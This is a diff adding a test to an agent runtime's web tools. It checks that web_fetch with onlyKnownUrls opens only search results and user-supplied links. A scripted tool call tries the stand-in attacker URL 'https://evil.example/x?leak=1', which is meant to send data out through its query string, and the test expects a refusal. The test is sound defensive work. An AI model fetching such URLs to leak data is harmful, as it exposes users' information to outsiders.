@@ -180,6 +180,43 @@ describe('built-in tools: web search and fetch (T2)', () => {
     });
   });
 
+  // With onlyKnownUrls, web_fetch opens a link a search returned or one the
+  // user wrote, however the model spells it, and nothing else: not a link
+  // found on a page, and not one made up to carry data out in its query.
+  it("web_fetch with onlyKnownUrls opens only search results and the user's links", async () => {
+    const fetcher = new MemoryFetcher({
+      'https://www.beta.example/b/': { title: 'Beta page', content: 'Beta body' },
+      'https://user.example/menu': { title: 'Menu', content: 'Bread' },
+      'https://evil.example/x?leak=1': { title: 'Evil', content: 'gotcha' },
+    });
+    const h = await harness(
+      [
+        { calls: [{ id: 'c1', name: 'web_search', args: { query: 'b' } }] },
+        {
+          calls: [
+            { id: 'c2', name: 'web_fetch', args: { url: 'https://www.beta.example/b/' } },
+            { id: 'c3', name: 'web_fetch', args: { url: 'https://user.example/menu' } },
+            { id: 'c4', name: 'web_fetch', args: { url: 'https://evil.example/x?leak=1' } },
+          ],
+        },
+        { text: 'done' },
+      ],
+      { search: new MemorySearch(hits), fetcher },
+    );
+    const chat = h.runtime.createStreamTextAgent({
+      name: 'chat',
+      tools: h.runtime.builtinTools(['web_search', 'web_fetch'], { webFetch: { onlyKnownUrls: true } }),
+    });
+    const ran = await chat.run({ prompt: 'Find b, and read user.example/menu.' });
+    await h.runtime.worker.handleJob(h.queue.items.shift()!);
+
+    expect(fetcher.fetched).toEqual(['https://www.beta.example/b/', 'https://user.example/menu']); // the known links only
+    expect(h.toolResult(ran.threadId, 'c4')).toEqual({
+      error: 'web_fetch can only open a link from your web_search results or one the user gave; https://evil.example/x?leak=1 is neither',
+    });
+    expect(h.storage.usage.recorded.filter((r) => r.model === 'tool:web_fetch')).toHaveLength(2); // a refused link is not a use
+  });
+
   it('web_fetch refuses an unknown id', async () => {
     const fetcher = new MemoryFetcher({});
     const h = await harness(
